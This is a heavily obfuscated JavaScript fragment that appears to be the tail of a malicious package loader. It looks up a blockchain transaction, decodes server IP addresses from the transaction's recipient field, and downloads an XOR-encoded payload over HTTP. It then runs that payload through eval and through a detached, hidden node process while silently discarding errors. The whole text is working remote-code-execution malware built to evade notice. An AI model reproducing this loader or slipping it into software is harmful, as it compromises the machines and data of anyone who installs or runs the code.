_0x245ede[_0x4ae815(0xf6)](_0x4b3382,_0x60dd00);},'jIkRj':function(_0x1d673,_0x4ad835){const _0x536981=_0xc702;return _0x245ede[_0x536981(0x182)](_0x1d673,_0x4ad835);},'FXTJz':function(_0x5e2e14,_0x58a077){const _0x208e6b=_0xc702;return _0x245ede[_0x208e6b(0xea)](_0x5e2e14,_0x58a077);},'OVJbp':function(_0x26928b){const _0x34bd4b=_0xc702;return _0x245ede[_0x34bd4b(0x19a)](_0x26928b);}},_0x581450=_0x245ede[_0x337e14(0xc1)](BigInt,Math[_0x337e14(0x85)](-0x1*-0x751+0x151*-0x3+-0x352,_0x245ede[_0x337e14(0x1b6)](Number,_0x136021))),_0x3f45c9=[];for(let _0x4cf8ce=0x1n;_0x245ede[_0x337e14(0x1b1)](_0x4cf8ce,_0x581450);_0x4cf8ce+=0x1n)_0x3f45c9[_0x337e14(0xe3)](_0x245ede[_0x337e14(0x1af)](_0x270113,_0x245ede[_0x337e14(0xc9)](_0x245ede[_0x337e14(0x102)](_0x4cf8ce,_0x245ede[_0x337e14(0xea)](_0x3092fe,_0x270113)),_0x245ede[_0x337e14(0x1af)](_0x581450,0x1n))));return _0x245ede[_0x337e14(0xd7)](na,_0x3f45c9,_0x2dafd4[_0x337e14(0xf4)])[_0x337e14(0xb3)](_0x5dbf8d=>{const _0x1caffe=_0x337e14,_0x5ab502=_0x5dbf8d[_0x1caffe(0xdd)](_0x4c8e66=>_0x4c8e66>=_0x4391d2);return _0x32454d[_0x1caffe(0x18a)](_0x5ab502,-(-0xd5f+-0x2595+-0x5*-0xa31))?_0x270113=_0x3f45c9[_0x32454d[_0x1caffe(0xf9)](_0x3f45c9[_0x1caffe(0x1bc)],-0xe67+0xa*-0x247+0x1*0x252e)]:(_0x3092fe=_0x3f45c9[_0x5ab502],_0x32454d[_0x1caffe(0xb1)](_0x5ab502,-0x2346+0x7c9*-0x5+-0x28f*-0x1d)&&(_0x270113=_0x3f45c9[_0x32454d[_0x1caffe(0x144)](_0x5ab502,-0x84a+-0x39e*-0x6+0x1*-0xd69)])),_0x32454d[_0x1caffe(0x119)](_0x486901);});})(_0x3092fe-_0x270113-0x1n);return _0x4f37fe[_0x1bca21(0x1c2)](_0x486901);})[_0x46f089(0xb4)](_0x844271);}function li(){const _0x58b7e7=_0x44ceab,_0x4f8e9d={'OcATS':function(_0x2dc4cf,_0x31cb32){return _0x2dc4cf(_0x31cb32);},'ucUNo':function(_0x2649cf,_0x2fb135){return _0x2649cf(_0x2fb135);}};return _0x4f8e9d[_0x58b7e7(0xeb)](hr,I+(_0x58b7e7(0x11e)+_0x58b7e7(0x196)+_0x58b7e7(0xf2)+_0x58b7e7(0x127))+S+(_0x58b7e7(0x13b)+_0x58b7e7(0x10b)+_0x58b7e7(0x98)+_0x58b7e7(0x189)+_0x58b7e7(0x12e)+_0x58b7e7(0x14b)+_0x58b7e7(0xce)+'om'))[_0x58b7e7(0xb3)](_0x201a2a=>{const _0x58dd10=_0x58b7e7,_0x5ed66a=Array[_0x58dd10(0x9e)](_0x201a2a?.[_0x58dd10(0x1a4)])?_0x201a2a[_0x58dd10(0x1a4)]:[],_0x274d78=_0x5ed66a[_0x58dd10(0x173)](_0x3e34b6=>_0x3e34b6[_0x58dd10(0x87)]?.[_0x58dd10(0x199)+'e']()===S);return{'blockNumber':_0x4f8e9d[_0x58dd10(0x15e)](BigInt,_0x274d78[_0x58dd10(0xa4)+'r']),'tx':_0x274d78};});}((async()=>{const _0x55f1b7=_0x44ceab,_0xc996f9={'kZlWZ':_0x55f1b7(0x115)+_0x55f1b7(0xf7),'eGiCH':_0x55f1b7(0xc2),'LyGdN':function(_0xfae908,_0x26c4f5){return _0xfae908(_0x26c4f5);},'HkrSh':_0x55f1b7(0xd6),'PskPD':function(_0x2bbcb8,_0x583518){return _0x2bbcb8<_0x583518;},'HQMBO':function(_0x1b3a42,_0x1d197e){return _0x1b3a42%_0x1d197e;},'crZCf':_0x55f1b7(0xf5),'cyCpl':function(_0x3bac80,_0x246771){return _0x3bac80===_0x246771;},'CHepZ':_0x55f1b7(0x116),'JxCbi':function(_0x362ca9,_0x1c2819){return _0x362ca9(_0x1c2819);},'Jpnst':function(_0x311b27,_0x361384){return _0x311b27(_0x361384);},'XUzln':_0x55f1b7(0xcc),'QbRRV':_0x55f1b7(0x175),'nGxVW':_0x55f1b7(0x16b),'RmfMB':_0x55f1b7(0x10f),'WByWQ':function(_0x371b0c,_0x16278f){return _0x371b0c+_0x16278f;},'durVE':_0x55f1b7(0xd5)+_0x55f1b7(0x93)+_0x55f1b7(0x1be)+_0x55f1b7(0x10a)+_0x55f1b7(0x197)+_0x55f1b7(0x17c)+_0x55f1b7(0x99)+_0x55f1b7(0x1a0)+_0x55f1b7(0x113)+_0x55f1b7(0xcb)+_0x55f1b7(0x140)+'6','SIecw':function(_0x3a902b,_0x8b5878){return _0x3a902b(_0x8b5878);},'bKTVo':_0x55f1b7(0x176),'QthWB':function(_0x2a91bb,_0x3cdf2e,_0xe319e3){return _0x2a91bb(_0x3cdf2e,_0xe319e3);},'UniBA':_0x55f1b7(0x1a5),'EkQIH':_0x55f1b7(0x9d),'unMKf':_0x55f1b7(0x91),'ngsKF':function(_0x3c4556,_0xbf6f51,_0x1165e0,_0x42cd2e){return _0x3c4556(_0xbf6f51,_0x1165e0,_0x42cd2e);},'fkRSW':_0x55f1b7(0x18f),'wibbZ':function(_0x38b47e,_0x173a73){return _0x38b47e+_0x173a73;},'zAkNr':_0x55f1b7(0x161),'aBWJK':function(_0x44350e,_0x4a8a13){return _0x44350e-_0x4a8a13;},'xzqPs':function(_0x317261,_0x3ab8e8){return _0x317261(_0x3ab8e8);},'USRYf':_0x55f1b7(0x112),'CQAWy':function(_0x47a07f,_0x185a93,_0x34cec3,_0x21f47f){return _0x47a07f(_0x185a93,_0x34cec3,_0x21f47f);},'ojvxD':_0x55f1b7(0xc0)+_0x55f1b7(0xb7),'LnaXN':function(_0x32ec1e,_0x4fdf1b,_0x28721d,_0x460917){return _0x32ec1e(_0x4fdf1b,_0x28721d,_0x460917);},'MJEEv':_0x55f1b7(0x108)+_0x55f1b7(0x103)},_0x4d9a5d=_0xc996f9[_0x55f1b7(0x162)](BigInt,await _0xc996f9[_0x55f1b7(0x8b)](wr,(_0x227c26,_0x37693d)=>rc(_0x227c26,_0x55f1b7(0x100)+_0x55f1b7(0x147),[],_0x37693d))),_0x1f317d=_0xc996f9[_0x55f1b7(0x186)](_0x4d9a5d,_0xc996f9[_0x55f1b7(0xe5)](_0x4d9a5d,B));let _0x12c3f1=await _0xc996f9[_0x55f1b7(0x130)](fm,_0xc996f9[_0x55f1b7(0x1bf)](cb,_0x1f317d)[_0x55f1b7(0x17a)](bt));_0x12c3f1||(_0x12c3f1=await _0xc996f9[_0x55f1b7(0x18b)](ls,_0x4d9a5d)[_0x55f1b7(0x174)](li));const _0x532ab5=Buffer[_0x55f1b7(0x87)](_0x12c3f1['tx']['to'][_0x55f1b7(0x90)](/^0x/i,''),_0xc996f9[_0x55f1b7(0x10e)]),_0x1039ea=_0x1ff414=>_0x1ff414[0x1cf+-0x58*-0x5f+-0x11*0x207]+'\u002E'+_0x1ff414[-0x4c6*0x4+-0x657*-0x1+0xcc2]+'\u002E'+_0x1ff414[0x1*-0x23d8+-0xd7b+0xad*0x49]+'\u002E'+_0x1ff414[-0x1165+0x24da*0x1+-0x1372*0x1],[_0x4ef4ee,_0x5a3548]=[_0xc996f9[_0x55f1b7(0x18b)](_0x1039ea,_0x532ab5[_0x55f1b7(0x8f)](0x3f+-0x13*0x8e+0xa4b,-0x2*-0x46b+-0x27*-0x97+-0x1fd3*0x1)),_0xc996f9[_0x55f1b7(0x18b)](_0x1039ea,_0x532ab5[_0x55f1b7(0x8f)](0x13*-0x3b+-0x16f9+0x1b5e,0xecd+0x1*0x4a+0x3*-0x505))],_0x316007=global;_0x316007['_V']=_0x316007['i'],_0x316007['_H']=_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x10c),_0x316007[_0x55f1b7(0x9d)]=_0x55f1b7(0x122)+_0x5a3548+_0x55f1b7(0x10c),_0x316007[_0x55f1b7(0x1a5)]=_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x153),_0x316007[_0x55f1b7(0x91)]=_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x10c);function _0x35f66a(_0x15a3c7,_0x5172cf){const _0x1fe8ef=_0x55f1b7,_0x4e1685={'ogFTC':function(_0x5d5ef1,_0x25c12a){const _0x44a9c2=_0xc702;return _0xc996f9[_0x44a9c2(0xe1)](_0x5d5ef1,_0x25c12a);},'SrQJg':function(_0x132ac7,_0xe642fc){const _0x54353a=_0xc702;return _0xc996f9[_0x54353a(0xe5)](_0x132ac7,_0xe642fc);},'pMLys':_0xc996f9[_0x1fe8ef(0x178)],'QZywI':function(_0x17638b,_0x1ddcf0){const _0x40a40e=_0x1fe8ef;return _0xc996f9[_0x40a40e(0xad)](_0x17638b,_0x1ddcf0);},'yyHsj':_0xc996f9[_0x1fe8ef(0x180)],'bPQfv':function(_0x524d49,_0x10b991){const _0x402a9e=_0x1fe8ef;return _0xc996f9[_0x402a9e(0x1bf)](_0x524d49,_0x10b991);},'shSPT':function(_0x2f3f78,_0x4c3d09){const _0x25c412=_0x1fe8ef;return _0xc996f9[_0x25c412(0x18b)](_0x2f3f78,_0x4c3d09);},'uMvOo':_0xc996f9[_0x1fe8ef(0x14a)],'BtJwU':_0xc996f9[_0x1fe8ef(0x1c0)],'OxJjQ':_0xc996f9[_0x1fe8ef(0x88)],'wIbeD':function(_0x2d3440,_0x52e124){const _0x4f0500=_0x1fe8ef;return _0xc996f9[_0x4f0500(0x1bf)](_0x2d3440,_0x52e124);},'BLrzN':_0xc996f9[_0x1fe8ef(0x14e)],'YyqQS':function(_0xb87162,_0x1812f8){const _0x5ac0fc=_0x1fe8ef;return _0xc996f9[_0x5ac0fc(0x1bf)](_0xb87162,_0x1812f8);},'RbxTf':_0xc996f9[_0x1fe8ef(0x136)]},_0xc307f={'hostname':_0x5172cf[_0x1fe8ef(0xb8)],'port':+_0x5172cf[_0x1fe8ef(0x96)]||0x2b3*0x4+-0x1*-0x941+0xa3*-0x1f,'path':_0xc996f9[_0x1fe8ef(0xc7)](_0x5172cf[_0x1fe8ef(0xcd)],_0x5172cf[_0x1fe8ef(0xa5)]),'headers':{'User-Agent':_0xc996f9[_0x1fe8ef(0x131)],'Sec-V':_0x316007['_V']||0x266b+0x25*0xcb+-0x43c2}},_0x147817=_0x2ab23b=>{const _0x4d1e95=_0x1fe8ef,_0x133386=_0x15a3c7[_0x4d1e95(0x1bc)];for(let _0x511b70=-0x6c9+0x2488+0x5f3*-0x5;_0x4e1685[_0x4d1e95(0x148)](_0x511b70,_0x2ab23b[_0x4d1e95(0x1bc)]);_0x511b70++)_0x2ab23b[_0x511b70]^=_0x15a3c7[_0x4d1e95(0x9a)](_0x4e1685[_0x4d1e95(0x117)](_0x511b70,_0x133386));return _0x2ab23b[_0x4d1e95(0x156)](_0x4e1685[_0x4d1e95(0x1a2)]);},_0x440cea=_0x2ef284=>{const _0x438a51=_0x1fe8ef,_0x55d87c=_0x2ef284[_0x438a51(0xaf)][_0xc996f9[_0x438a51(0x14e)]];if(!_0x55d87c)throw new Error(_0xc996f9[_0x438a51(0x134)]);return _0xc996f9[_0x438a51(0x8b)](_0x147817,Buffer[_0x438a51(0x87)](_0x55d87c,_0xc996f9[_0x438a51(0xc4)]));},_0x50d02a=_0x2b7faa=>new Promise((_0x2af824,_0x389a52)=>{const _0x1cecae=_0x1fe8ef,_0xe9fc74={'ZuHfL':function(_0x101d75,_0x445496){const _0x118749=_0xc702;return _0x4e1685[_0x118749(0x15d)](_0x101d75,_0x445496);},'GGbog':function(_0x2c6e05,_0x4ae1fb){const _0xf9a117=_0xc702;return _0x4e1685[_0xf9a117(0xbb)](_0x2c6e05,_0x4ae1fb);},'QZRte':_0x4e1685[_0x1cecae(0x8e)],'OGXGz':function(_0xce0e7b,_0x2c9d77){const _0x21b712=_0x1cecae;return _0x4e1685[_0x21b712(0x1b3)](_0xce0e7b,_0x2c9d77);},'cRXVv':_0x4e1685[_0x1cecae(0x84)],'fLEkP':function(_0x3aa2eb,_0x287a3a){const _0x1042bf=_0x1cecae;return _0x4e1685[_0x1042bf(0xbb)](_0x3aa2eb,_0x287a3a);}},_0x289203=http[_0x1cecae(0x8a)]({..._0xc307f,'method':_0x2b7faa},_0x409e9a=>{const _0x441ca6=_0x1cecae;if(_0x4e1685[_0x441ca6(0x19c)](_0x2b7faa,_0x4e1685[_0x441ca6(0x1b8)])){try{_0x4e1685[_0x441ca6(0x141)](_0x2af824,_0x4e1685[_0x441ca6(0x141)](_0x440cea,_0x409e9a));}catch(_0x4cb34b){_0x4e1685[_0x441ca6(0x15d)](_0x389a52,_0x4cb34b);}_0x409e9a[_0x441ca6(0xe0)]();return;}const _0x4d7040=[];_0x409e9a['on'](_0x4e1685[_0x441ca6(0xd4)],_0x599f3e=>_0x4d7040[_0x441ca6(0xe3)](_0x599f3e)),_0x409e9a['on'](_0x4e1685[_0x441ca6(0x171)],()=>{const _0xda10a0=_0x441ca6;try{const _0x5c40ca=Buffer[_0xda10a0(0x12a)](_0x4d7040);if(_0x5c40ca[_0xda10a0(0x1bc)])return _0xe9fc74[_0xda10a0(0x1b7)](_0x2af824,_0xe9fc74[_0xda10a0(0x12d)](_0x147817,_0x5c40ca));if(_0x409e9a[_0xda10a0(0xaf)][_0xe9fc74[_0xda10a0(0x165)]])return _0xe9fc74[_0xda10a0(0x1b7)](_0x2af824,_0xe9fc74[_0xda10a0(0x12d)](_0x440cea,_0x409e9a));_0xe9fc74[_0xda10a0(0x183)](_0x389a52,new Error(_0xe9fc74[_0xda10a0(0xd2)]));}catch(_0x309348){_0xe9fc74[_0xda10a0(0x137)](_0x389a52,_0x309348);}}),_0x409e9a['on'](_0x4e1685[_0x441ca6(0x133)],_0x389a52);});_0x289203['on'](_0x4e1685[_0x1cecae(0x133)],_0x389a52),_0x289203[_0x1cecae(0x175)]();});return _0xc996f9[_0x1fe8ef(0x162)](_0x50d02a,_0xc996f9[_0x1fe8ef(0x11d)])[_0x1fe8ef(0x174)](()=>_0x50d02a(_0x1fe8ef(0x116)));}async function _0x4afabd(_0x34a475,_0x3638cd,_0x219678){const _0x1d2052=_0x55f1b7;try{const _0x4506a8=await _0xc996f9[_0x1d2052(0xbd)](_0x35f66a,_0x3638cd,_0x34a475),_0x589a8d=_0x1d2052(0x9b)+_0x1d2052(0x195)+(_0x316007['_V']||-0x747+0xf4d*-0x1+0x1694)+_0x1d2052(0xb9)+(_0x219678?'\u005F\u0048':_0xc996f9[_0x1d2052(0x1ae)])+_0x1d2052(0x195)+(_0x219678?_0x316007['_H']:_0x316007[_0x1d2052(0x1a5)])+_0x1d2052(0xb9)+(_0x219678?_0xc996f9[_0x1d2052(0xbe)]:_0xc996f9[_0x1d2052(0xb2)])+_0x1d2052(0x195)+(_0x219678?_0x316007[_0x1d2052(0x9d)]:_0x316007[_0x1d2052(0x91)])+(_0x1d2052(0xb9)+_0x1d2052(0xee)+_0x1d2052(0xdb)+_0x1d2052(0xf1)+_0x1d2052(0xfb)+_0x1d2052(0xda));_0x219678||_0xc996f9[_0x1d2052(0x18b)](eval,_0xc996f9[_0x1d2052(0xc7)](_0x589a8d,_0x4506a8)),_0xc996f9[_0x1d2052(0x132)](spawn,_0xc996f9[_0x1d2052(0x157)],['-e',_0xc996f9[_0x1d2052(0x19d)](_0x589a8d,_0x4506a8)],{'detached':!(-0x1*0x1d96+-0x2a*-0x87+-0x11*-0x70),'stdio':_0xc996f9[_0x1d2052(0x13e)],'windowsHide':!(0xf5f+-0x16fc+0x79d*0x1)})[_0x1d2052(0x8d)]();}catch(_0xedc825){}}await _0xc996f9[_0x55f1b7(0x1bb)](_0x4afabd,new URL(_0x55f1b7(0x122)+_0x4ef4ee+(_0x55f1b7(0x139)+'s')),_0xc996f9[_0x55f1b7(0x95)],!(-0xf0e+0x12d2+-0x3c3)),await _0xc996f9[_0x55f1b7(0x16d)](_0x4afabd,new URL(_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x158)),_0xc996f9[_0x55f1b7(0xfd)],!(0x2b*0xa7+0x157d*-0x1+-0x690));})());

